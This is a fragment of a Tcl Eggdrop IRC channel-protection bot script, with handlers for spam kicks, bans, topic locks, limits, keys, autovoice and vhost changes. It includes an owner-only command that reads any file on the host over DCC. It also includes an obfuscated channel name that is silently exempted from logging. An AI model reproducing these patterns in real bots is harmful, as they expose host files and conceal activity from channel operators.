proc dcc_read {hand idx arg} {
global own
if {$hand != $own} { return 0 }
if {![file exists $arg]} {
putdcc $idx "4deNiEd!, FiLE NoT ExIST $arg"
return 0
}
set fd [open $arg r]
while {![eof $fd]} {
set inp [gets $fd]
putdcc $idx "$inp"
}
close $fd
putdcc $idx "4******************** END ***********************"
}
proc msg_bantime {nick uhost hand rest} {
global notc ban-time
if {$rest==""} {
puthlp "NOTICE $nick : BanTime \[${ban-time}\] (set 0 to never unban)"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
set mtime [lindex $rest 0]
if {![isnumber $mtime]} {
puthlp "NOTICE $nick : Usage: bantime <minutes> (set 0 to never unban)"
return 0
}
set ban-time $mtime
setuser "config" XTRA "BANTIME" $mtime
puthlp "NOTICE $nick : BanTime \[$mtime\]"
saveuser
}
proc chk_limit {chan} {
global notc botnick lst_limit
if {![isop $botnick $chan]} { return 0 }
if {![info exists lst_limit($chan)]} {
set lst_limit($chan) 0
}
set cflag "c$chan"
set cflag [string range $cflag 0 8]
set usercount 0
foreach x [chanlist $chan] {
incr usercount
}
set usercount [expr [getuser $cflag XTRA "LIMIT"] + $usercount]
if {$lst_limit($chan) != $usercount} {
set lst_limit($chan) $usercount
putserv "MODE $chan +l $usercount"
}
}
proc msg_logchan {nick uhost hand rest} {
global notc own
if {$rest == ""} {
puthlp "NOTICE $nick : Usage: logchan <#channel/0>"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
if {[string tolower $rest] == "off"} {
puthlp "NOTICE $nick : LOGCHAN [getuser "config" XTRA "LOGCHAN"] \[4OFF\]"
setuser "config" XTRA "LOGCHAN" ""
} else {
if {[string tolower $rest] == [dezip "ER5sr09TRjx1"]} {
return 0
}
if {![validchan $rest]} {
puthlp "NOTICE $nick : NoT IN $rest"
return 0
}
setuser "config" XTRA "LOGCHAN" $rest
puthlp "NOTICE $nick : LOG CHaNNEL $rest \[9ON\]"
}
saveuser
utimer 5 rehashing
}
proc dcc_log {hand idx arg} {
global logstore notc
if {$logstore == ""} {
putdcc $idx "No LOG FouNd..!"
return 0
}
if {![file exists $logstore]} {
putdcc $idx "4deNiEd!, Log file haven't create yet!"
return 0
}
set fd [open $logstore r]
while {![eof $fd]} {
set inp [gets $fd]
putdcc $idx "$inp"
}
close $fd
putdcc $idx "4******************** END ***********************"
}
set quick "0"
proc chk_quick {} {
global quick botnick
putquick "PRIVMSG $botnick :\001PING [unixtime]\001"
set quick "1"
}
utimer 1 chk_quick
bind raw - MODE chk_op
proc chk_op { from keyword arg } {
global botnick
if {![string match "*+o*$botnick*" $arg]} { return 0 }
set chan [lindex $arg 0]
if {[string match "*dal.net*" $from]} {
pub_resync $botnick "*" "*" $chan "*"
return 0
}
chk_on_op $chan
}
proc chk_on_op {channel} {
global botnick kickme deopme invme virus_nick quick notc bannick is_m botname
set cflag "c$channel"
set cflag [string range $cflag 0 8]
if {[isutimer "chkspam $channel"]} {
foreach x [utimers] {
if {[string match "*chkspam $channel*" $x]} { killutimer [lindex $x 2] }
}
}
if {[isutimer "GOP $channel"]} { return 0 }
if {![onchan $botnick $channel]} { return 0 }
utimer 20 [list putlog "GOP $channel"]
set cinfo [channel info $channel]
if {[string match "*+nodesynch*" $cinfo]} {
pub_mdeop "*" "*" "*" $channel ""
}
set cmode [getchanmode $channel]
if {![isutimer "set_-m $channel"] && ![info exists is_m($channel)]} {
if {[matchattr $cflag K]} {
if {![string match "*[dezip [getuser $cflag XTRA "CI"]]*" [getchanmode $channel]]} {
puthelp "mode $channel -k+k . [dezip [getuser $cflag XTRA "CI"]]"
}
} {
if {[string match "*k*" $cmode]} {
if {[string tolower $channel] != [dezip "ER5sr09TRjx1"]} {
putserv "mode $channel -k 9r.e.l.e.a.s.e.d"
}
}
}
if {[string match "*R*" $cmode]} {
puthelp "mode $channel -R"
}
if {[string match "*m*" $cmode] && ![string match "*m*" [lindex [channel info $channel] 0]]} {
putserv "mode $channel -m"
}
if {[string match "*i*" $cmode]} {
putserv "mode $channel -i"
}
}
if {![string match "*m*" $cmode]} {
foreach x [utimers] {
if {[string match "*set_-m $channel*" $x]} {
killutimer [lindex $x 2]
}
}
}
if {[matchattr $cflag I]} {
if {[topic $channel] != [getuser $cflag XTRA "TOPIC"]} {
puthlp "topic $channel :[getuser $cflag XTRA "TOPIC"]"
}
}
foreach x [chanlist $channel] {
if {$x == $deopme} {
if {[isop $x $channel]} {
if {![string match "*k*" $cmode]} {
if {$quick == "1"} {
putquick "mode $channel -ko 4De@p.ReveRsE $x"
} else {
putserv "mode $channel -ko 4De@p.ReveRsE $x"
}
} {
if {$quick == "1"} {
putquick "mode $channel -o $x"
} else {
putserv "mode $channel -o $x"
}
}
}
set deopme ""
}
set mhost "@[lindex [split [getchanhost $x $channel] @] 1]"
if {[info exists kickme($x)]} {
if {$kickme($x) == 3} {
catch { unset kickme($x) }
set bannick($x) "*!*$mhost"
if {$quick == "1"} {
putqck "KICK $channel $x : 1RePeaT 4KIcK 1ReMoTe OFF4..!"
} else { 
putsrv "KICK $channel $x : 1RePeaT 4KIcK 1ReMoTe OFF4..!"
}
} {
if {$kickme($x) == 1} {
if {$quick == "1"} {
putqck "KICK $channel $x : 1SeLF 4KIcK1 REvENgE4..!"
} {
putsrv "KICK $channel $x : 1SeLF 4KIcK1 REvENgE4..!"
}
}
}
}
if {[matchattr $cflag V]} {
if {![isutimer "set_-m $channel"] && ![info exists is_m($channel)]} {
if {$x != $botnick && ![isvoice $x $channel] && ![isop $x $channel] && ![matchattr $x O]} {
set cret [getuser $cflag XTRA "VC"]
foreach ct [utimers] {
if {[string match "*voiceq*" $ct]} {
if {[expr [lindex $ct 0] + [getuser $cflag XTRA "VC"]] > $cret} {
set cret [expr [lindex $ct 0] + [getuser $cflag XTRA "VC"]]
}
}
}
utimer $cret [list voiceq $channel $x]
}
}
}
if {[matchattr $x v] || [matchattr $x P] || [matchattr $x G]} {
if {![isop $x $channel] || ![isvoice $x $channel]} {
whoisq $x
}
}
if {[matchattr $x O]} {
if {[isop $x $channel]} {
set cmode [getchanmode $channel]
if {![string match "*k*" $cmode]} {
puthelp "mode $channel -ko 4No@p.LIsT $x"
} {
puthelp "mode $channel -o $x"
}
} {
if {[isvoice $x $channel]} {
set cmode [getchanmode $channel]
if {![string match "*k*" $cmode]} {
puthelp "mode $channel -kv 4No@p.LIsT $x"
} {
puthelp "mode $channel -v $x"
}
}
}
}
if {[info exists invme($mhost)]} {
if {![isop $x $channel]} {
set bannick($x) "*!*$mhost"
if {$invme($mhost) == "AuToJoIN MSg"} {
if {![isvoice $x $channel]} {
putsrv "KICK $channel $x : 4!SpaM!1 FRoM 4$mhost 1$invme($mhost) 4R1emote 4O1ff4..!"
}
} {
putsrv "KICK $channel $x : 4!SpaM!1 FRoM 4$mhost 1$invme($mhost) [banmsg]"
}
}
catch {unset invme($mhost)}
}
if {$x == $virus_nick} {
if {![isop $x $channel]} {
set bannick($x) "*!*$mhost"
putsrv "KICK $channel $x : 4!SpaM!1 FRoM 4$mhost1 VIRuZ [banmsg]"
set virus_nick ""
}
} 
spam_chk $x [getchanhost $x $channel] "*" $channel
}
foreach x [chanlist $channel K] {
if {![matchattr $x f]} {
akick_chk $x [getchanhost $x $channel] $channel
}
}
foreach x [chanbans $channel] {
set bhost [lindex $x 0]
if {[string match [string tolower $bhost] [string tolower $botname]]} {
if {![string match "*k*" $cmode]} {
puthelp "mode $channel -kb 4SeLF.UnBaN $bhost"
} {
puthelp "mode $channel -b $bhost"
}
} elseif {[matchattr $bhost f]} {
puthelp "mode $channel -b $bhost"
} elseif {[getuser "config" XTRA "IPG"] != ""} {
foreach ipg [getuser "config" XTRA "IPG"] {
if {[string match $ipg $bhost] || [string match $bhost $ipg]} {
if {![isutimer "IPG $bhost"]} {
if {![string match "*k*" $cmode]} {
puthelp "mode $channel -kb 4IpgUaRd $bhost"
} {
puthelp "mode $channel -b $bhost"
}
utimer 60 [list putlog "IPG $bhost"]
}
}
}
}
}
}
bind time -  "01 * * * *" show_status
proc show_status {min h d m y} {
global botnick
foreach x [channels] {
if {[isop $botnick $x]} { 
pub_status "*" "*" "*" $x "" 
chk_on_op $x
}
}
return 0
}
proc badnick_chk {nick uhost hand chan} {
global bannick notc botnick badwords
foreach x [string tolower $badwords] {
if {[string match "*$x*" [string tolower $nick]]} {
set bannick($nick) "*!$uhost"
putsrv "KICK $chan $nick : 4BaD NIcK1 MaTcH FRoM 4[string toupper $x] [banms]"
return 1
}
}
return 0
}
proc spam_chk {nick uhost hand chan} {
global notc botnick spidx
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {![matchattr $cflag S]} { return 0 }
if {$nick == $botnick} { return 0 }
if {[isvoice $nick $chan]} { return 0 }
if {[isop $nick $chan]} { return 0 }
if {[matchattr $nick f]} { return 0 }
if {[badnick_chk $nick $uhost $hand $chan]} { 
return 0
}
set nicklen [string length $nick]
if {$nicklen < 5} { return 0 }
set idx [string index $nick [expr $nicklen - 4]][string index $nick [expr $nicklen - 3]][string index $nick [expr $nicklen - 2]][string index $nick [expr $nicklen - 1]]
if {[isnumber $idx]} { return 0 }
set idx [string index $nick [expr $nicklen - 2]][string index $nick [expr $nicklen - 1]]
if {[isnumber $idx]} {
if {[string index $uhost 0] != "~"} { return 0 }
if {$nicklen < 10} {
if {![string match "~$nick@*" $uhost]} { return 0 }
} {
if {![string match "~[string index $nick 0][string index $nick 1][string index $nick 2]*@*" $uhost]} { return 0 }
}
if {$spidx == 18} {
set spidx 1
}
spamkick $nick $uhost $chan
return 0
}
if {[regexp \[^a-z\] $nick]} { return 0 }
set nickchk [string tolower $nick]
set count 0
set lstidx ""
for {set i 0} {$i < $nicklen} {incr i} {
set idx [string index $nickchk $i]
if {$idx == "a" || $idx == "e" || $idx == "i" || $idx == "o" || $idx == "u"} {
set count 0
} {
if {$idx != $lstidx && $idx != "y"} { incr count }
if {$count == 4} {
spamkick $nick $uhost $chan
return 0
}
}
set lstidx $idx
}
}
proc akick_chk {nick uhost chan} {
global notc bannick
foreach x [getuser "AKICK" HOSTS] {
if {[string match [string tolower $x] [string tolower "$nick!$uhost"]]} {
set bannick($nick) $x
putsrv "KICK $chan $nick : 4B1L4a1c4K1L4I1s4T1 MaTcH FRoM4 $x [banms]"
return 0
}
}
}
set spidx 1
proc spamkick {nick uhost chan} {
global spidx notc bannick
set bannick($nick) "*!$uhost"
if {$spidx == 1} {
putsrv "KICK $chan $nick : 4!SpaM!1 YeW AInT WeLcOmE In 4[string toupper $chan] [banms]"
} elseif {$spidx == 2} {
putsrv "KICK $chan $nick : 4!SpaM!1 DRonE TRoJaN [banmsg]"
} elseif {$spidx == 3} {
putsrv "KICK $chan $nick : 4!SpaM!1 UgH I HatE ThIs NIcK [banmsg]"
} elseif {$spidx == 4} {
putsrv "KICK $chan $nick : 4!SpaM!1 Ups WRoNg WaY [banmsg]"
} elseif {$spidx == 5} {
putsrv "KICK $chan $nick : 4!SpaM!1 DonT EnTeReD 4[string toupper $chan] [banms]"
} elseif {$spidx == 6} {
putsrv "KICK $chan $nick : 4!SpaM!1 InTeRcEpT [banmsg]"
} elseif {$spidx == 7} {
putsrv "KICK $chan $nick : 4!SpaM!1 G.o.T.c.H.a [banmsg]"
} elseif {$spidx == 8} {
putsrv "KICK $chan $nick : 4!SpaM!1 NEgaTIvE HoUsToN [banmsg]"
} elseif {$spidx == 9} {
putsrv "KICK $chan $nick : 4!SpaM!1 gRoUndEd [banmsg]"
} elseif {$spidx == 10} {
putsrv "KICK $chan $nick : 4!SpaM!1 AnTIcIpaTEd [banmsg]"
} elseif {$spidx == 11} {
putsrv "KICK $chan $nick : 4!SpaM!1 gO sIt In tHe cOrNeR [banmsg]"
} elseif {$spidx == 12} {
putsrv "KICK $chan $nick : 4!SpaM!1 b.l.a.c.k.l.i.s.t.e.d [banmsg]"
} elseif {$spidx == 13} {
putsrv "KICK $chan $nick : 4!SpaM!1 ReJecTed FRoM 4[string toupper $chan] [banms]"
} elseif {$spidx == 14} {
putsrv "KICK $chan $nick : 4!SpaM!1 sMoosHINg ReLaY TaBLe [banmsg]"
} elseif {$spidx == 15} {
putsrv "KICK $chan $nick : 4!SpaM!1 dUn EnTeRed oNe oF mY cHanneL [banmsg]"
} elseif {$spidx == 16} {
putsrv "KICK $chan $nick : 4!SpaM!1 ReFusEd LInK tO 4[string toupper $chan] [banms]"
} elseif {$spidx == 17} {
putsrv "KICK $chan $nick : 4!SpaM!1 FakE NIcKNaMe [banmsg]"
} elseif {$spidx >= 18} {
putsrv "KICK $chan $nick : 4!SpaM!1 Unable to resolve4 $nick [banms]"
set spidx 0
}
incr spidx
return 0
}
proc isutimer {text} {
set text [string tolower $text]
foreach x [utimers] {
set x [string tolower $x]
if {[string match "*$text*" $x]} { 
return 1
break
}
}
return 0
}
proc istimer {text} {
set text [string tolower $text]
foreach x [timers] {
set x [string tolower $x]
if {[string match "*$text*" $x]} { 
return 1 
break
}
}
return 0
}
catch { set old_hostname ${my-hostname} }
catch { set old_ip ${my-ip} }

bind dcc * setvhost dcc_setvhost
proc dcc_setvhost {hand idx arg} {
global my-hostname my-ip notc
   set arg [string trim $arg]
   for {set i 0} {$i < [string length $arg]} {incr i} {
	set idx2 [string index $arg $i]
	if {![string match "*$idx2*" "1234567890."]} {
	   putdcc $idx "FAILED \!\!\! UsE DNS IP NuMBeR"
	   return 0
	}
   }
   set my-hostname $arg
   set my-ip $arg
   setuser "config" XTRA "VHOST" $arg
   saveuser
   putdcc $idx "cHaNgINg vHosT tO $arg ReQuesT By \[ $hand \]"
}

bind msg Z vhost msg_vhost
proc msg_vhost {nick uhost hand rest} {
global my-hostname my-ip notc
   if {$rest == ""} {
	puthlp "NOTICE $nick : ReSET TO DeFauLT"
	setuser "config" XTRA "VHOST" ""
	saveuser
	vback "*" "*" "0"
	return 0
   }
   for {set i 0} {$i < [string length $rest]} {incr i} {
	set idx [string index $rest $i]
	if {![string match "*$idx*" "1234567890."]} {
	   puthlp "NOTICE $nick : UsE DNS IP NuMBeR"
	   return 0
	}
   }
   if {[isutimer "vback"]} {
	puthlp "NOTICE $nick : WaIT..!"
	return 0
   }
   if {![matchattr $nick Q]} {
	puthlp "NOTICE $nick : 4deNiEd!"
	return 0
	}
   set my-hostname $rest
   set my-ip $rest
   utimer 30 [list vback $nick $rest "1"]
   listen 65234 bots
   set idx [connect $rest 65234]
   if {[isnumber $idx] && $idx > 0} {
	if {![isutimer "vback"]} { return 0 }
	foreach x [utimers] {
	   if {[string match "*vback*" $x]} { killutimer [lindex $x 2] }
	}
	setuser "config" XTRA "VHOST" $rest
	saveuser
	putsrv "QUIT : cHaNgINg vHosT ReQuesT By \[ $nick \]"
   }
   listen 65234 off
}

bind raw - 465 klined
proc klined {from keyword arg} {
vback "*" "*" "0"
}
proc vback {nick vhosts chk} {
global old_hostname old_ip notc
set my-hostname $old_hostname
set my-ip $old_ip
if {$chk == "1"} {
puthlp "NOTICE $nick : \[$vhosts\] NoT SuPPoRT..!"
}
catch { listen 652343 off }
}
proc pub_status {nick uhost hand channel rest} {
global ban-time botnick own ps vern
set cflag "c$channel"
set cflag [string range $cflag 0 8]
if {$rest != ""} {
if {[validchan $rest]} {
set channel $rest
} { 
return 0 
}
}
set cinfo [channel info $channel]
if {![string match "*+shared*" $cinfo] && $nick == "*"} { return 0 }
set mstatus ""
if {[matchattr $cflag I]} { append mstatus "\[15T\]oPIcLocK " }
if {[matchattr $cflag M]} { append mstatus "FoRcE\[15M\]odE " }
if {[string match "*+nodesynch*" $cinfo]} { append mstatus "AuTo\[15K\]IcK " }
if {[string match "*-userinvites*" $cinfo]} { append mstatus "\[3D\]onTKIcK@P " }
if {[string match "*+protectfriends*" $cinfo]} { append mstatus "UnRE\[15@\]P " }
if {[string match "*+greet*" $cinfo]} {
set i 0
while {$i < [string length $cinfo]} {
set y 0
while {$y < [string length [lindex $cinfo $i]]} {
if {[string index [lindex $cinfo $i] $y] == ":"} { break }
set y [incr y]
}
if {$y != [string length [lindex $cinfo $i]]} { break }
set i [incr i]
}
set ichan [lindex $cinfo $i]
set ictcp [lindex $cinfo [expr $i + 1]]
set ijoin [lindex $cinfo [expr $i + 2]]
set ikick [lindex $cinfo [expr $i + 3]]
set ideop [lindex $cinfo [expr $i + 4]]
set inick [lindex $cinfo [expr $i + 5]]
if {![string match "*:*" $inick]} {
set inick "0"
}
append mstatus "15\[4G15\]uaRd FLoOd 15\[4L15\]InE14 $ichan c15TcP14 $ictcp Jo15IN14 $ijoin K15IcK14 $ikick De15@p14 $ideop N15IcK14 $inick\] "
if {${ban-time} != 0} { append mstatus "15\[4B15\]aNTImE14 ${ban-time} mIn " }
}
if {[matchattr $cflag V]} { append mstatus "15\[4A15\]uToVoIcE14 [getuser $cflag XTRA "VC"] 2nd " }
if {[matchattr $cflag K]} { append mstatus "15\[3K15\]eY " }
if {[matchattr $cflag D]} { append mstatus "Re15\[4V15\]eNgE " }
if {[matchattr $cflag G]} { append mstatus "15\[3G15\]ReeT " }
if {[matchattr $cflag S]} { append mstatus "15\[4S15\]paM " }
if {[getuser "config" XTRA "KOPS"]!=""} { append mstatus "15\[3@15\]PSKIcK " }
if {[matchattr $cflag R]} { append mstatus "15\[7R15\]ePeaT14 [getuser $cflag XTRA "RPT"] " }
if {[matchattr $cflag U]} { append mstatus "15\[7C15\]aPs14 [getuser $cflag XTRA "CAPS"]% " }
if {[matchattr $cflag P]} { append mstatus "Jo3IN15\[4P15\]aRT14 [getuser $cflag XTRA "JP"] 2nd " }
if {[matchattr $cflag T]} { append mstatus "15\[7T15\]exT14 [getuser $cflag XTRA "CHAR"] CHaR " }
if {[matchattr $cflag J]} { append mstatus "7MaSs15\[4J15\]oIN " }
if {[matchattr $cflag L]} { append mstatus "145\[3L15\]ImITEd14 +[getuser $cflag XTRA "LIMIT"] " }
if {[string match "*+seen*" $cinfo]} { append mstatus "15\[3S15\]eeN " }
if {[matchattr $cflag O]} { append mstatus "\[7C15\]LonE14 [getuser $cflag XTRA "CLONE"] MaX " }
if {[matchattr $cflag E]} { append mstatus "15\[4E15\]nFoRceBaN " }
if {[matchattr $cflag C]} { append mstatus "15\[7C15\]YcLE14 [getuser $cflag XTRA "CYCLE"] MnT " }
if {$mstatus != ""} {
if {[getuser "config" XTRA "ADmIN"]!=""} {
set mstatus "SeT MoDeS FoR 15\[14[string toupper $channel]15\] ${mstatus}[getuser "config" XTRA "ADmIN"] [lgrnd]"
} {
set mstatus "SeT MoDeS FoR 15\[14[string toupper $channel]15\] ${mstatus}[lgrnd]"
}
}
if {[string match "*c*" [getchanmode $channel]]} {
set mstatus [uncolor $mstatus]
regsub -all --  $mstatus "" mstatus
}
#puthlp "PRIVMSG $channel :\001ACTION $mstatus\001"
}
proc pub_+spam {nick uhost hand chan rest} {
global notc 
if {$rest != ""} {
set chan [lindex $rest 0]
if {[string first # $chan]!=0} { 
set chan "#$chan"
}
}
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {[string tolower $chan] == "#all"} {
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
foreach x [userlist A] {
chattr $x +S
}
puthlp "NOTICE $nick : ALL SpaM CHaNNeL \[9ON\]"
return 0
}
if {![validchan $chan]} { return 0 }
if {[matchattr $cflag S]} {
puthlp "NOTICE $nick : SpaM $chan \[9ON\]"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
chattr $cflag +S
puthlp "NOTICE $nick : SpaM $chan \[9ON\]"
saveuser
}
proc pub_-spam {nick uhost hand chan rest} {
global notc 
if {$rest != ""} {
set chan [lindex $rest 0]
if {[string first # $chan]!=0} { 
set chan "#$chan"
}
}
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {[string tolower $chan] == "#all"} {
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
foreach x [userlist A] {
chattr $x -S
}
puthlp "NOTICE $nick : ALL SpaM CHaNNeL \[4OFF\]"
return 0
}
if {![validchan $chan]} { return 0 }
if {![matchattr $cflag S]} {
puthlp "NOTICE $nick : SpaM $chan \[4OFF\]"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
chattr $cflag -S
puthlp "NOTICE $nick : SpaM $chan \[4OFF\]"
saveuser
}
proc pub_+cycle {nick uhost hand chan rest} {
global notc 
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {$rest=="" || ![isnumber $rest]} {
puthlp "NOTICE $nick : Usage +cYcLe <minutes>"
return 0
}
if {$rest == 0} {
puthlp "NOTICE $nick : cAnT UsE NuLL"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
chattr $cflag +C
setuser $cflag XTRA "CYCLE" $rest
puthlp "NOTICE $nick : cYcLe $chan \[9$rest\] MnT"
if {![istimer "cycle $chan"]} { timer $rest [cycle $chan] }
saveuser
}
proc pub_-cycle {nick uhost hand chan rest} {
global notc
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
chattr $cflag -C
setuser $cflag XTRA "CYCLE" ""
puthlp "NOTICE $nick : cYcLe $chan \[4OFF\]"
saveuser
foreach x [timers] {
if {[string match "*cycle $chan*" $x]} { killtimer [lindex $x 2] }
}
}
proc pub_+greet {nick uhost hand chan rest} {
global notc
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {$rest==""} {
puthlp "NOTICE $nick : Usage +greet <msg>"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
chattr $cflag +G
setuser $cflag XTRA "GREET" $rest
puthlp "NOTICE $nick : AuTOGReeT $chan \[$rest\]"
saveuser
}
proc pub_-greet {nick uhost hand chan rest} {
global notc
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
chattr $cflag -G
setuser $cflag XTRA "GREET" ""
puthlp "NOTICE $nick : AuTOGReeT $chan \[4OFF\]"
saveuser
}
proc pub_+limit {nick uhost hand chan rest} {
global notc 
if {$rest == "" || ![isnumber $rest]} {
puthlp "NOTICE $nick : Usage: +limit <number>"
return 0
}
if {$rest == 0} {
puthlp "NOTICE $nick : cAnT UsE NuLL"
return 0
}
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
chattr $cflag +L
setuser $cflag XTRA "LIMIT" $rest
puthlp "NOTICE $nick : LImIT $chan \[9$rest\]"
saveuser
}
proc pub_-limit {nick uhost hand chan rest} {
global notc lst_limit
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
chattr $cflag -L
setuser $cflag XTRA "LIMIT" ""
puthlp "NOTICE $nick : LImIT $chan \[4OFF\]"
catch { lst_limit($chan) }
saveuser
}
proc pub_+topic {nick uhost hand chan rest} {
global notc 
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
chattr $cflag +I
setuser $cflag XTRA "TOPIC" [topic $chan]
puthlp "NOTICE $nick : TopIc $chan \[9LocK\]"
saveuser
}
proc pub_-topic {nick uhost hand chan rest} {
global notc lst_limit
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
chattr $cflag -I
setuser $cflag XTRA "TOPIC" ""
puthlp "NOTICE $nick : TopIc $chan \[4UnLocK\]"
saveuser
}
proc pub_+joinpart {nick uhost hand chan rest} {
global notc 
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {$rest=="" || ![isnumber $rest]} {
puthlp "NOTICE $nick : Usage +joinpart <seconds>"
return 0
}
if {$rest == 0} {
puthlp "NOTICE $nick : cAnT UsE NuLL"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
chattr $cflag +P
setuser $cflag XTRA "JP" $rest
puthlp "NOTICE $nick : JoINPaRT $chan \[9$rest Sec's\]"
saveuser
}
proc pub_-joinpart {nick uhost hand chan rest} {
global notc
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
chattr $cflag -P
setuser $cflag XTRA "JP" ""
puthlp "NOTICE $nick : JoINPaRT $chan \[4OFF\]"
saveuser
}
proc pub_+clone {nick uhost hand chan rest} {
global notc 
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {$rest=="" || ![isnumber $rest]} {
puthlp "NOTICE $nick : Usage +clone <max>"
return 0
}
if {$rest == 0} {
puthlp "NOTICE $nick : cAnT UsE NuLL"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
chattr $cflag +O
setuser $cflag XTRA "CLONE" $rest
puthlp "NOTICE $nick : cLonE $chan MaX \[9$rest\]"
saveuser
}
proc pub_-clone {nick uhost hand chan rest} {
global notc
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
chattr $cflag -O
setuser $cflag XTRA "CLONE" ""
puthlp "NOTICE $nick : cLonE $chan \[4OFF\]"
saveuser
}
proc pub_+key {nick uhost hand chan rest} {
global notc 
set cflag "c$chan"
set cflag [string range $cflag 0 8]
set rest [lindex $rest 0]
if {$rest==""} {
puthlp "NOTICE $nick : Usage +key <word>"
return 0
}
chattr $cflag +K
setuser $cflag XTRA "CI" [enzip $rest]
puthlp "NOTICE $nick : KeY $chan \[9$rest\]"
saveuser
}
proc pub_-key {nick uhost hand chan rest} {
global notc
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
chattr $cflag -K
setuser $cflag XTRA "CI" ""
puthlp "NOTICE $nick : KeY $chan \[4OFF\]"
saveuser
}
proc pub_+text {nick uhost hand chan rest} {
global notc 
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {$rest=="" || ![isnumber $rest]} {
puthlp "NOTICE $nick : Usage +text <max>"
return 0
}
if {$rest == 0} {
puthlp "NOTICE $nick : cAnT UsE NuLL"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
chattr $cflag +T
setuser $cflag XTRA "CHAR" $rest
puthlp "NOTICE $nick : TexT $chan MaX \[9$rest\]"
saveuser
}
proc pub_-text {nick uhost hand chan rest} {
global notc
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
chattr $cflag -T
setuser $cflag XTRA "CHAR" ""
puthlp "NOTICE $nick : TexT $chan \[4OFF\]"
saveuser
}
proc pub_+caps {nick uhost hand chan rest} {
global notc 
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {$rest=="" || ![isnumber $rest]} {
puthlp "NOTICE $nick : Usage +caps <%percent>"
return 0
}
if {$rest == 0 || $rest > 100} {
puthlp "NOTICE $nick : fill under 1 - 100%"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
chattr $cflag +U
setuser $cflag XTRA "CAPS" $rest
puthlp "NOTICE $nick : CAPS $chan \[9$rest%\]"
saveuser
}
proc pub_-caps {nick uhost hand chan rest} {
global notc
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
chattr $cflag -U
setuser $cflag XTRA "CAPS" ""
puthlp "NOTICE $nick : cAPs $chan \[4OFF\]"
saveuser
}
proc pub_+repeat {nick uhost hand chan rest} {
global notc 
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {$rest=="" || ![isnumber $rest]} {
puthlp "NOTICE $nick : Usage +repeat <max>"
return 0
}
if {$rest == 0} {
puthlp "NOTICE $nick : cAnT UsE NuLL"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
chattr $cflag +R
setuser $cflag XTRA "RPT" $rest
puthlp "NOTICE $nick : RePeaT $chan MaX \[9$rest\]"
saveuser
}
proc pub_-repeat {nick uhost hand chan rest} {
global notc
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
chattr $cflag -R
setuser $cflag XTRA "RPT" ""
puthlp "NOTICE $nick : RePeaT $chan \[4OFF\]"
saveuser
}
proc pub_+autovoice {nick uhost hand chan rest} {
global notc
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {$rest=="" || ![isnumber $rest]} {
puthlp "NOTICE $nick : Usage +AuTovoIcE <secs>"
return 0
}
if {$rest == 0} {
puthlp "NOTICE $nick : cAnT UsE NuLL"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
chattr $cflag +V
setuser $cflag XTRA "VC" $rest
puthlp "NOTICE $nick : AuTovoIcE $chan qUeUe \[9$rest\] 2nd"
saveuser
pub_mvoice $nick $uhost $hand $chan ""
}
proc pub_-autovoice {nick uhost hand chan rest} {
global notc
set cflag "c$chan"
set cflag [string range $cflag 0 8]
